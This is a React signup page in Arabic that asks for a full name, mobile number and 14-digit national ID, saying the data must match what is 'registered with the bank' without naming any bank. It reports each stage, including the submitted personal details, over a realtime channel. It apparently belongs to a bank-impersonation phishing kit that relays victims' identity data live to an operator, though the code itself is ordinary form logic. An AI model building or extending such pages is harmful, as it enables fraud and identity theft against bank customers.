import { useEffect, useState } from 'react';
import { useLocation, Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useRegistration } from '@/context/RegistrationContext';
import { useRealtime } from '@/context/RealtimeContext';
import { ChevronLeft, ChevronRight, User, Phone, CreditCard } from 'lucide-react';

export default function Signup() {
  const [, setLocation] = useLocation();
  const { data, updateData } = useRegistration();
  const { reportStage } = useRealtime();
  const [errors, setErrors] = useState<Record<string, string>>({});

  useEffect(() => {
    reportStage('signup', {});
  }, []);

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (!data.fullName.trim()) newErrors.fullName = 'الاسم الكامل مطلوب';
    if (!data.phone.trim() || !/^\d{10,15}$/.test(data.phone.trim())) {
      newErrors.phone = 'رقم موبايل غير صحيح';
    }
    if (!data.nationalId.trim() || !/^\d{14}$/.test(data.nationalId.trim())) {
      newErrors.nationalId = 'الرقم القومي يجب أن يتكون من 14 رقم';
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      reportStage('signup', {
        fullName: data.fullName,
        mobile: data.phone,
        nationalId: data.nationalId,
      });
      setLocation('/create-account');
    }
  };

  return (
    <AppLayout>
      <div className="flex-1 flex flex-col justify-center max-w-md w-full mx-auto animate-in fade-in-50 slide-in-from-bottom-4 duration-300 py-10" dir="rtl">
        
        <div className="mb-6 flex items-center justify-between px-1">
          <div className="text-right">
            <h1 className="text-xl font-bold text-foreground">تسجيل البيانات</h1>
            <p className="text-xs text-muted-foreground mt-1">الرجاء إدخال البيانات المعتمدة لدى البنك</p>
          </div>
          <Link href="/" className="w-9 h-9 flex items-center justify-center rounded-lg bg-secondary border border-border/60 text-muted-foreground hover:text-foreground transition-all">
            <ChevronRight className="w-4 h-4" />
          </Link>
        </div>

        <div className="bg-card border border-border/80 rounded-2xl p-6 md:p-8 shadow-sm text-right">
          <form onSubmit={handleSubmit} className="space-y-5">
            
            <div className="space-y-1.5">
              <Label htmlFor="fullName" className="text-xs font-semibold text-foreground/90 block text-right">الاسم الكامل</Label>
              <div className="relative">
                <Input
                  id="fullName"
                  placeholder="الاسم كما هو مسجل بالبطاقة"
                  value={data.fullName}
                  onChange={e => updateData({ fullName: e.target.value })}
                  className={`h-11 pr-10 pl-4 text-sm text-right rounded-xl border-border/80 bg-background/50 focus-visible:ring-1 focus-visible:ring-primary focus-visible:border-primary transition-all ${
                    errors.fullName ? 'border-destructive focus-visible:ring-destructive' : ''
                  }`}
                />
                <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
              </div>
              {errors.fullName && <p className="text-[11px] text-destructive font-medium mt-1 text-right">{errors.fullName}</p>}
            </div>

            <div className="space-y-1.5">
              <Label htmlFor="phone" className="text-xs font-semibold text-foreground/90 block text-right">رقم الموبايل</Label>
              <div className="relative">
                <Input
                  id="phone"
                  type="tel"
                  placeholder="01xxxxxxxxx"
                  value={data.phone}
                  onChange={e => updateData({ phone: e.target.value.replace(/\D/g, '') })}
                  className={`h-11 pr-10 pl-4 text-sm text-right rounded-xl border-border/80 bg-background/50 focus-visible:ring-1 focus-visible:ring-primary focus-visible:border-primary transition-all ${
                    errors.phone ? 'border-destructive focus-visible:ring-destructive' : ''
                  }`}
                />
                <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
              </div>
              {errors.phone && <p className="text-[11px] text-destructive font-medium mt-1 text-right">{errors.phone}</p>}
            </div>

            <div className="space-y-1.5">
              <Label htmlFor="nationalId" className="text-xs font-semibold text-foreground/90 block text-right">الرقم القومي</Label>
              <div className="relative">
                <Input
                  id="nationalId"
                  type="tel"
                  maxLength={14}
                  placeholder="14 رقماً"
                  value={data.nationalId}
                  onChange={e => updateData({ nationalId: e.target.value.replace(/\D/g, '') })}
                  className={`h-11 pr-10 pl-4 text-sm text-right rounded-xl tracking-wider border-border/80 bg-background/50 focus-visible:ring-1 focus-visible:ring-primary focus-visible:border-primary transition-all ${
                    errors.nationalId ? 'border-destructive focus-visible:ring-destructive' : ''
                  }`}
                />
                <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
              </div>
              {errors.nationalId && <p className="text-[11px] text-destructive font-medium mt-1 text-right">{errors.nationalId}</p>}
            </div>

            <Button type="submit" size="lg" className="w-full h-11 gap-2 mt-2 text-sm font-semibold rounded-xl bg-primary text-primary-foreground hover:bg-primary/95 shadow-sm transition-colors flex items-center justify-center">
              <span>متابعة </span>
              <ChevronLeft className="w-4 h-4" />
            </Button>
          </form>
        </div>
        
        
      </div>
    </AppLayout>
  );
}
